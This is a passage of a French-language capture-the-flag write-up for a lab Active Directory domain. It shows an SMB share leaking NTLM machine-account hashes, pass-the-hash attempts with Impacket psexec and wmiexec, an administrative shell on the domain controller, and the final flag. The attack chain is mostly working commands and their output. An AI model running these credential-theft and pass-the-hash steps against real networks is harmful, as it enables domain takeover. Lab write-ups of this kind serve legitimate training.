SMB         192.168.56.128  445    DC01             backup          READ            
SMB         192.168.56.128  445    DC01             C$                              Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.56.128  445    DC01             Users
```

Et là, c'est le pot aux roses !

```console
$ smbclient -U file_svc //192.168.56.128/backup
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 19:41:17 2024
  ..                                 DR        0  Mon Jun 17 19:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 10:41:05 2024

                12942591 blocks of size 4096. 10931178 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (17,1 KiloBytes/sec) (average 17,1 KiloBytes/sec)
smb: \> exit
$ cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```

### Passes, passes le hash, exécute mon batch

Aucun de ces hashs ne tombe avec rockyou mais il s'agit de hashs NTLM, on peut faire du PTH :

```console
$ psexec.py -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'soupedecode.local/FileServer$@192.168.56.128'
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.56.128.....
[*] Found writable share ADMIN$
[*] Uploading file NUdEGhbw.exe
[*] Opening SVCManager on 192.168.56.128.....
[*] Creating service ZeUh on 192.168.56.128.....
[*] Starting service ZeUh.....
[*] Opening SVCManager on 192.168.56.128.....
[-] Error performing the uninstallation, cleaning up
```

Testons avec `wmiexec` :

```console
$ wmiexec.py -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'soupedecode.local/FileServer$@192.168.56.128'
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
soupedecode\fileserver$

C:\>whoami /all

USER INFORMATION
----------------

User Name               SID                                         
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes                                                     
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group             
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group             
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group             
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level               Label            S-1-16-12288                                                                                               


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Le compte faisant partie du groupe administrateurs, on peut obtenir le flag final :

```console
C:\>cd c:\users\administrator\desktop
c:\users\administrator\desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of c:\users\administrator\desktop

06/17/2024  10:44 AM    <DIR>          .
06/15/2024  12:56 PM    <DIR>          ..
06/17/2024  10:41 AM    <DIR>          backup
06/17/2024  10:44 AM                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  44,772,167,680 bytes free

c:\users\administrator\desktop>type root.txt
a9564ebc3289b7a14551baf8ad5ec60a
```
